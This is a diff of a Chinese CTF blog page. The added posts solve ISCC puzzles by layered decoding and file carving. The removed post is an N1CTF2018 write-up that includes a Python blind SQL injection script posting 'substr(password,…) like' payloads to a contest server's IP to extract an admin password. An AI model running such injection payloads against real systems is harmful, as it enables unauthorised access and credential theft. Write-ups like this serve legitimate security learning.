+<h3 id="重重谍影"><a href="#重重谍影" class="headerlink" title="重重谍影"></a>重重谍影</h3><p><strong>HINT：这是一道脑洞题，简单的要命。层层迷雾之后就是答案，刹那便是永恒。南无阿弥陀佛。</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180516/h1KfgBKi00.png?imageslim" alt="mark"></p>
+<pre><code>Vm0wd2QyVkZOVWRXV0doVlYwZG9WVll3WkRSV2JGbDNXa1JTVjAxWGVGWlZNakExVjBaS2RHVkljRnBXVm5CUVZqQmtTMUl4VG5OaFJtUlhaV3RHTkZkWGRHdFRNVXB6V2toV2FsSnNjRmhhVjNoaFYxWmFjMWt6YUZSTlZtdzBWVEo0YzJGR1NuTlhiR2hYWVd0d2RsUnRlR3RqYkdSMFVteFdUbFp0ZHpCV2EyTXhVekZSZUZkc1ZsZGhlbXhoVm01d1IyTldjRVZTYlVacVZtdHdlbGRyVlRWVk1ERldZMFZ3VjJKR2NIWlpWRXBIVWpGT1dXSkhhRlJTVlhCWFZtMDFkMUl3TlhOVmJGcFlZbGhTV1ZWcVFURlRWbEY0VjIxR2FGWnNjSGxaYWs1clZqSkdjbUo2UWxwV1JWcDZWbXBHVDJNeGNFaGpSazVZVWxWd1dWWnRNVEJXTVUxNFdrVmtWbUpHV2xSWlZFNVRWVVpzYzFadVpGUmlSbHBaVkZaU1ExWlhSalpTYTJSWFlsaENVRll3V21Gak1XUnpZVWRHVTFKV2NGRldha0poV1ZkU1YxWnVTbEJXYldoVVZGUktiMDB4V25OYVJFSm9UVlpXTlZaSE5VOVdiVXB5WTBaYVdtRXhjRE5aTW5oVFZqRmFkRkpzWkU1V2JGa3dWbXhrTUdFeVJraFRiRnBYWVd4d1dGWnFUbE5YUmxsNVRWVmFiRkp0VW5wWlZWcFhZVlpLZFZGdWJGZGlXRUpJV1ZSS1QxWXhTblZWYlhoVFlYcFdWVmRYZUZOamF6RkhWMjVTYWxKWVVrOVZiVEUwVjBaYVNFNVZPVmRXYlZKS1ZWZDRhMWRzV2taWGEzaFhUVlp3V0ZwR1pFOVRSVFZZWlVkc1UyRXpRbHBXYWtvd1lURkplRmR1U2s1V1ZscHdWVzB4VTFac1duUk5WazVPVFZkU1dGZHJWbXRoYXpGeVRsVndWbFl6YUZoV2FrWmhZekpPUjJKR1pGTmxhMVYzVjJ0U1IyRXhUa2RWYmtwb1VtdEtXRmxzWkc5a2JHUllaRVprYTJKV1ducFhhMXB2Vkd4T1NHRklRbFZXTTJoTVZqQmFZVk5GTlZaa1JscFRZbFpLU0ZaSGVGWmxSbHBYVjJ0YVQxWldTbFpaYTFwM1dWWndWMXBHWkZSU2EzQXdXVEJWTVZZeVNuSlRWRUpYWWtad2NsUnJXbHBsUmxweVdrWm9hVkpzY0ZsWFYzUnJWVEZaZUZkdVVtcGxhMHB5VkZaYVMxZEdXbk5oUnpsWVVteHNNMWxyVWxkWlZscFhWbGhvVjFaRldtaFdha3BQVWxaU2MxcEhhRTVpUlc4eVZtdGFWMkV4VVhoYVJXUlVZa2Q0Y1ZWdGRIZGpSbHB4VkcwNVZsWnRVbGhXVjNSclYyeGFjMk5GYUZkaVIyaHlWbTB4UzFaV1duSlBWbkJwVW14d2IxZHNWbUZoTWs1elZtNUtWV0pHV2s5V2JHaERVMVphY1ZKdE9XcE5WbkJaVld4b2IxWXlSbk5UYldoV1lURmFhRlJVUm1GamJIQkhWR3hTVjJFelFqVldSM2hoWVRGU2RGTnJXbXBTVjFKWVZGWmFTMUpHYkhGU2JrNVlVbXR3ZVZkcldtdGhWa2w1WVVjNVYxWkZTbWhhUkVaaFZqRldjMWRzWkZoU01taFFWa1phWVdReFNuTldXR3hyVWpOU2IxVnRkSGRXYkZwMFpVaE9XbFpyY0ZsV1YzQlBWbTFXY2xkdGFGWmlXRTE0Vm0xNGExWkdXbGxqUms1U1ZURldObFZyVGxabGJFcENTbFJPUlVwVVRrVSUzRA==
+</code></pre><p><strong>可以看到及似一串base64编码，<a href="http://www1.tc711.com/tool/BASE64.htm" title="base64在线解码" target="_blank" rel="external">base64在线解码</a>一下</strong></p>
+<p><strong>直到不能解码为止，发现是一个类似AES加密的密文</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180516/2IkK0dA8d1.png?imageslim" alt="mark"></p>
+<pre><code>U2FsdGVkX183BPnBd50ynIRM3o8YLmwHaoi8b8QvfVdFHCEwG9iwp4hJHznrl7d4%0AB5rKClEyYVtx6uZFIKtCXo71fR9Mcf6b0EzejhZ4pnhnJOl+zrZVlV0T9NUA+u1z%0AiN+jkpb6ERH86j7t45v4Mpe+j1gCpvaQgoKC0Oaa5kc%3D
+</code></pre><p><strong>处理一下</strong></p>
+<pre><code>U2FsdGVkX183BPnBd50ynIRM3o8YLmwHaoi8b8QvfVdFHCEwG9iwp4hJHznrl7d4
+B5rKClEyYVtx6uZFIKtCXo71fR9Mcf6b0EzejhZ4pnhnJOl+zrZVlV0T9NUA+u1z
+iN+jkpb6ERH86j7t45v4Mpe+j1gCpvaQgoKC0Oaa5kc=
+</code></pre><p><strong>之后<a href="http://tool.oschina.net/encrypt" title="AES在线解密" target="_blank" rel="external">AES在线解密</a>一下</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180516/k7Hhm7g8hh.png?imageslim" alt="mark"><br><strong>发现解密出来的东西很像是一个名为<code>与佛论禅</code>的加密</strong></p>
+<pre><code>缽娑遠呐者若奢顛悉呐集梵提梵蒙夢怯倒耶哆般究有栗
+</code></pre><p><strong>拿到<a href="http://www.keyfc.net/bbs/tools/tudoucode.aspx" title="与佛论禅" target="_blank" rel="external">与佛论禅</a>的网站解密一下，注意解密方法</strong></p>
+<p><img src="http://p008biu9n.bkt.clouddn.com/blog/180516/mlHB71g3Db.png?imageslim" alt="mark"><br><strong>所以这道题的flag就是</strong></p>
+<pre><code>把我复制走
+</code></pre><p><strong>南无阿弥陀佛~</strong></p>
+<h3 id="数字密文"><a href="#数字密文" class="headerlink" title="数字密文"></a>数字密文</h3><p><strong>HINT:这里有个很简单的flag，藏在下面这串数字里，猜猜吧！69742773206561737921</strong></p>
+<p><strong>可以看出这像是一串16进制编码，解码一下即可</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180516/5bFI9F3Fg6.png?imageslim" alt="mark"></p>
+<pre><code>flag:it&apos;s easy!
+</code></pre><h3 id="一只猫的心思"><a href="#一只猫的心思" class="headerlink" title="一只猫的心思"></a>一只猫的心思</h3><p><strong>下载附件解压后是一个图片</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180516/BhhBab5h33.png?imageslim" alt="mark"><br><strong>用winhex查看一下，发现有字符区域WPS字样，猜测图片里隐藏了word文档，因为word文档（doc、xls）的文件头16进制为<code>D0CF11E0</code>，于是尝试查找16进制</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180516/6Kddage3bb.png?imageslim" alt="mark"><br><strong>可以看出在<code>D0CF11E0</code>在<code>FFD9</code>尾部（jpg的文件尾16进制为FFD9），所以图片里确实藏有doc文档，位置还是在jpg图片的尾部</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180516/j22G2BG4aB.png?imageslim" alt="mark"><br><strong>知道了这些后，接下来用winhex将doc文档从图片中分离出来，选中属于word文件的16进制区域，右键，Edit-&gt;Copy Block-&gt;Into New Flie</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180516/kfe41m3IIi.png?imageslim" alt="mark"><br><strong>用WPS打开noname文件</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180516/8eJd74J1J8.png?imageslim" alt="mark"><br><strong>可以看出内容又是一串经过<code>与佛论禅</code>加密后的密文，去与佛论禅网站在线解密一下</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180516/i9L72dDc0K.png?imageslim" alt="mark"><br><strong>解密出如下内容</strong></p>
+<pre><code>523156615245644E536C564856544E565130354B553064524D6C524E546B4A56535655795645644F5530524857544A4553553943566B644A4D6C524E546C7052523155795645744F536C5248515670555330354452456456576B524854554A585231457956554E4F51305A4855544E4553303153566B64424D6C524A546B7058527A525A5245744F576C5A4854544A5554553554513063304E46524C54564A5652316B795255744F51305A4856544E5554564661566B6C464D6B5252546B70595231557A5245394E516C5A4856544A555355354B566B644E5756524E5455705752316B7A5255564F55305248566B465553564A4356306C4E4D6C524E546B4A565231557952453152556C564A56544A455555354B5530644E5756525054554A56523030795645314F516C5A4857544A4553303143566B64464D305648546B744352314A425645744F576C5A4855544A4651303543566B64564D6B524854554A555230557A52454E4F536C644855544A5554553543566B645A4D6B564A546C4E445231566152456C52576C5A4855544A5553303544516B64564D6C524C54564A55523045795245314F556C4A4856544E455355354B56556C564D6B564E546B70535230315A52457452536C564951544A555455354B565564535156524A54564A575230457956456C4E576C46485454525553303143566B6446576C564A54544A46
+</code></pre><p><strong>可以看到是一串类似16进制的编码，16进制解码后得到</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180516/bFh7k8HJ5B.png?imageslim" alt="mark"></p>
+<pre><code>R1VaREdNSlVHVTNVQ05KU0dRMlRNTkJVSVUyVEdOU0RHWTJESU9CVkdJMlRNTlpRR1UyVEtOSlRHQVpUS05DREdVWkRHTUJXR1EyVUNOQ0ZHUTNES01SVkdBMlRJTkpXRzRZREtOWlZHTTJUTU5TQ0c0NFRLTVJVR1kyRUtOQ0ZHVTNUTVFaVklFMkRRTkpYR1UzRE9NQlZHVTJUSU5KVkdNWVRNTUpWR1kzRUVOU0RHVkFUSVJCV0lNMlRNTkJVR1UyRE1RUlVJVTJEUU5KU0dNWVRPTUJVR00yVE1OQlZHWTJES01CVkdFM0VHTktCR1JBVEtOWlZHUTJFQ05CVkdVMkRHTUJUR0UzRENOSldHUTJUTU5CVkdZMkVJTlNDR1VaRElRWlZHUTJUS05DQkdVMlRLTVJUR0EyRE1OUlJHVTNESU5KVUlVMkVNTkpSR01ZREtRSlVIQTJUTU5KVUdSQVRJTVJWR0EyVElNWlFHTTRUS01CVkdFWlVJTTJF
+</code></pre><p><strong>再进行base64解码得到</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180516/cLef2ge7I5.png?imageslim" alt="mark"></p>
+<pre><code>GUZDGMJUGU3UCNJSGQ2TMNBUIU2TGNSDGY2DIOBVGI2TMNZQGU2TKNJTGAZTKNCDGUZDGMBWGQ2UCNCFGQ3DKMRVGA2TINJWG4YDKNZVGM2TMNSCG44TKMRUGY2EKNCFGU3TMQZVIE2DQNJXGU3DOMBVGU2TINJVGMYTMMJVGY3EENSDGVATIRBWIM2TMNBUGU2DMQRUIU2DQNJSGMYTOMBUGM2TMNBVGY2DKMBVGE3EGNKBGRATKNZVGQ2ECNBVGU2DGMBTGE3DCNJWGQ2TMNBVGY2EINSCGUZDIQZVGQ2TKNCBGU2TKMRTGA2DMNRRGU3DINJUIU2EMNJRGMYDKQJUHA2TMNJUGRATIMRVGA2TIMZQGM4TKMBVGEZUIM2E
+</code></pre><p><strong>发现不能继续base64解码，于是尝试<a href="http://www.qqxiuzi.cn/bianma/base.php" title="base32解码" target="_blank" rel="external">base32解码</a>，又得到一串16进制编码的字符</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180516/793HGfBemk.png?imageslim" alt="mark"></p>
+<pre><code>5231457A5245644E536C6448525670555530354C5230645A4E4652505456705753566B7952464E4E576C5A485756705554553161566B6C5A4D6C5644546B4E485231704356456450516C5A4A57544A4554303161564564564D6B524C54554A555230466156454E4F51305A4856544A425054303950513D3D
+</code></pre><p><strong>再次16进制解码，得到</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180516/J2fg7abC8c.png?imageslim" alt="mark"></p>
+<pre><code>R1EzREdNSldHRVpUU05LR0dZNFRPTVpWSVkyRFNNWlZHWVpUTU1aVklZMlVDTkNHR1pCVEdPQlZJWTJET01aVEdVMkRLTUJUR0FaVENOQ0ZHVTJBPT09PQ==
+</code></pre><p><strong>再次进行base64解码，得到</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180516/7DdBIaa74k.png?imageslim" alt="mark"></p>
+<pre><code>GQ3DGMJWGEZTSNKGGY4TOMZVIY2DSMZVGYZTMMZVIY2UCNCGGZBTGOBVIY2DOMZTGU2DKMBTGAZTCNCFGU2A====
+</code></pre><p><strong>发现又不能进行base64解码了，于是用base32解码，得到</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180516/di5KkBGC4l.png?imageslim" alt="mark"><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180516/h7eDbL5I2d.png?imageslim" alt="mark"></p>
+<pre><code>463161395F69735F493563635F5A4F6C385F4733545030314E54
+</code></pre><p><strong>再进行16进制解码，就能得到flag了</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180516/FIfeCBbcjl.png?imageslim" alt="mark"></p>
+<pre><code>flag：F1a9_is_I5cc_ZOl8_G3TP01NT
+</code></pre><h3 id="有趣的ISCC"><a href="#有趣的ISCC" class="headerlink" title="有趣的ISCC"></a>有趣的ISCC</h3><p><strong>HINT：在ISCC的平台上，跟小伙伴们一起闯关，是不是很有趣啊！！！猜猜我在图片中隐藏了什么？</strong></p>
+<p><strong>下载附件解压后是一个图片</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180516/bf79A2KllA.png?imageslim" alt="mark"><br><strong>用winhex查看一下该图片，发现文件尾有一些编码</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180516/gI0A6GlK8a.png?imageslim" alt="mark"></p>
+<pre><code>&amp;#92;&amp;#117;&amp;#48;&amp;#48;&amp;#54;&amp;#54;&amp;#92;&amp;#117;&amp;#48;&amp;#48;&amp;#54;&amp;#99;&amp;#92;&amp;#117;&amp;#48;&amp;#48;&amp;#54;&amp;#49;&amp;#92;&amp;#117;&amp;#48;&amp;#48;&amp;#54;&amp;#55;&amp;#92;&amp;#117;&amp;#48;&amp;#48;&amp;#55;&amp;#98;&amp;#92;&amp;#117;&amp;#48;&amp;#48;&amp;#54;&amp;#57;&amp;#92;&amp;#117;&amp;#48;&amp;#48;&amp;#55;&amp;#51;&amp;#92;&amp;#117;&amp;#48;&amp;#48;&amp;#54;&amp;#51;&amp;#92;&amp;#117;&amp;#48;&amp;#48;&amp;#54;&amp;#51;&amp;#92;&amp;#117;&amp;#48;&amp;#48;&amp;#50;&amp;#48;&amp;#92;&amp;#117;&amp;#48;&amp;#48;&amp;#54;&amp;#57;&amp;#92;&amp;#117;&amp;#48;&amp;#48;&amp;#55;&amp;#51;&amp;#92;&amp;#117;&amp;#48;&amp;#48;&amp;#50;&amp;#48;&amp;#92;&amp;#117;&amp;#48;&amp;#48;&amp;#54;&amp;#54;&amp;#92;&amp;#117;&amp;#48;&amp;#48;&amp;#55;&amp;#53;&amp;#92;&amp;#117;&amp;#48;&amp;#48;&amp;#54;&amp;#101;&amp;#92;&amp;#117;&amp;#48;&amp;#48;&amp;#55;&amp;#100; 
+</code></pre><p><strong>html解码一下，发现是一串unicode</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180516/jKbC755A7f.png?imageslim" alt="mark"></p>
+<pre><code>\u0066\u006c\u0061\u0067\u007b\u0069\u0073\u0063\u0063\u0020\u0069\u0073\u0020\u0066\u0075\u006e\u007d 
+</code></pre><p><strong>unicode解码一下，这里直接用python输出就好，得到flag</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180516/047IB022ac.png?imageslim" alt="mark"></p>
+<pre><code>flag{iscc is fun}
+</code></pre><h3 id="凯撒十三世"><a href="#凯撒十三世" class="headerlink" title="凯撒十三世"></a>凯撒十三世</h3><p><strong>HINT：凯撒十三世在学会使用键盘后，向你扔了一串字符：“ebdgc697g95w3”，猜猜它吧。</strong></p>
+<p><strong>根据提示先将这串字符<a href="http://www.qqxiuzi.cn/bianma/ROT5-13-18-47.php" title="rot13解密" target="_blank" rel="external">rot13解密</a>一下，得到</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180516/j663FihbdA.png?imageslim" alt="mark"></p>
+<pre><code>roqtp697t95j3
+</code></pre><p><strong>再查看键盘，找到这些字符串每个字符在键盘上下面位置的字符，比如<code>r</code>下面的字符为<code>f</code>，依次替换就能得到flag</strong></p>
+<pre><code>flag:yougotme
+</code></pre>
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
     <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/05/19/apache_security_config/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -2064,190 +3091,6 @@ R4：ip route-static 192.168.2.1 255.255.255.0 1.1.1.1
 
 
     
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/03/12/N1CTF2018/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="Lawliet">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/images/LuFei.jpg">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Lawliet Blog">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2018/03/12/N1CTF2018/" itemprop="url">N1CTF2018 77777 writeup</a></h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-03-12T10:53:49+08:00">
-                2018-03-12
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-            <span class="post-category" >
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">分类于</span>
-              
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/ctf/" itemprop="url" rel="index">
-                    <span itemprop="name">ctf</span>
-                  </a>
-                </span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <h1 id="N1CTF2018-77777-writeup"><a href="#N1CTF2018-77777-writeup" class="headerlink" title="N1CTF2018 77777 writeup"></a>N1CTF2018 77777 writeup</h1><h3 id="序"><a href="#序" class="headerlink" title="序"></a>序</h3><p><strong>之前比赛开始时看了签到题，死活没写出来，泪，之后听同学说起了这道题，在结束前不到一小时做了做，无奈比赛结束，flag没交上去，那就记录一下过程吧</strong></p>
-<h3 id="题目：77777"><a href="#题目：77777" class="headerlink" title="题目：77777"></a>题目：77777</h3><p><strong>题目说”77777” is my girlfriend’s nickname，出题人大佬的女朋友外号叫77777，当然以我看过签到题的心情来看，这和道题并没什么关系，重点还在题目中给的一小段代码中，代码如下</strong></p>
-<p><img src="http://p008biu9n.bkt.clouddn.com/blog/180312/a2EE46LmeH.png?imageslim" alt="mark"></p>
-<p><strong>代码接收post参数中的flag和hi，拼接后更新数据库的points值，并在<code>http://47.97.168.223/#profile</code>页面中显示points值，简单来说，post参数可控，我们可以提交参数构造数据库中女朋友的points，并且在页面显示points值</strong></p>
-<pre><code>update users set points=&apos;post过来的flag和hi拼接后的结果&apos;
-</code></pre><p><strong>当然hi是经过waf函数处理的，看来是绕waf的注入，简单了测试了一下，过滤了updatexml,extractvalue,database()等函数，报错回显这个思路暂时放弃了，因为information_schema也被过滤了，做起来会很麻烦</strong></p>
-<p><strong>题目的第二个提示</strong></p>
-<pre><code>the flag is `admin&apos;s password`:)
-</code></pre><p><img src="http://p008biu9n.bkt.clouddn.com/blog/180312/Hj66G37HjJ.png?imageslim" alt="mark"><br><strong>猜测数据库里有password字段,由此想到第二个思路，提交:</strong></p>
-<pre><code>flag=任意数字&amp;hi=任意数字 and (构造逻辑判断)
-</code></pre><p><strong>数据库语句变为:</strong></p>
-<pre><code>update users set points=任意数字 and （构造逻辑判断）
-</code></pre><p><strong>如果逻辑判断为真，将points值更新为1，为假则更新为0,构造逻辑判断的时候发现=也被过滤，用like替代即可,思路有了开始写脚本</strong></p>
-<pre><code>import requests
-import string
-list=string.maketrans(&quot;&quot;,&quot;&quot;)[33:127]#所有可显示字符，后面猜测password内容使用
-url=&quot;http://47.97.168.223/#profile&quot;#显示分数页面
-#read password
-#i=0
-#while 1:
-#    payload={&apos;flag&apos;:1,&apos;hi&apos;:&apos;1 and length(password) like %d&apos;%(i)}
-#    html=requests.post(url=url,data=payload).content
-#    if &quot;&lt;grey&gt;My Points&lt;/grey&gt; | 1&lt;br/&gt;&quot; in html:#points为1说明长度正确，输出并break
-#        print i
-#        break
-#    else:
-#        i=i+1
-#password length is 13
-#read password
-i=0
-for i in range(1,14):
-    for j in list:
-        payload={&apos;flag&apos;:1,&apos;hi&apos;:&quot;1 and substr(password,%d,1) like &apos;%s&apos;&quot;%(i,j)}
-        html=requests.post(url=url,data=payload).content
-        if &quot;&lt;grey&gt;My Points&lt;/grey&gt; | 1&lt;br/&gt;&quot; in html:#points为1说明内容正确，输出并break
-            print j
-            break
-#flag is HE3L3LOCAT233
-</code></pre><p><strong>脚本通过<code>1 and length(password) like %d</code>来判断password长度为13，为真时页面points显示为1，否则为0</strong></p>
-<p><img src="http://p008biu9n.bkt.clouddn.com/blog/180312/823DJ2bh5f.png?imageslim" alt="mark"></p>
-<p><strong>然后<code>1 and substr(password,%d,1) like &#39;%s&#39;</code>循环判断password内容，为真时页面的points值显示为1，否则为0</strong></p>
-<p><img src="http://p008biu9n.bkt.clouddn.com/blog/180312/FGB5bcl7F0.png?imageslim" alt="mark"></p>
-<p><strong>flag为N1CTF{HE3L3LOCAT233}</strong></p>
-
-          
-        
-      
-    </div>
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
   </section>
 
   
@@ -2302,7 +3145,7 @@ for i in range(1,14):
               
                 <a href="/archives/">
               
-                  <span class="site-state-item-count">31</span>
+                  <span class="site-state-item-count">32</span>
                   <span class="site-state-item-name">日志</span>
                 </a>
               </div>
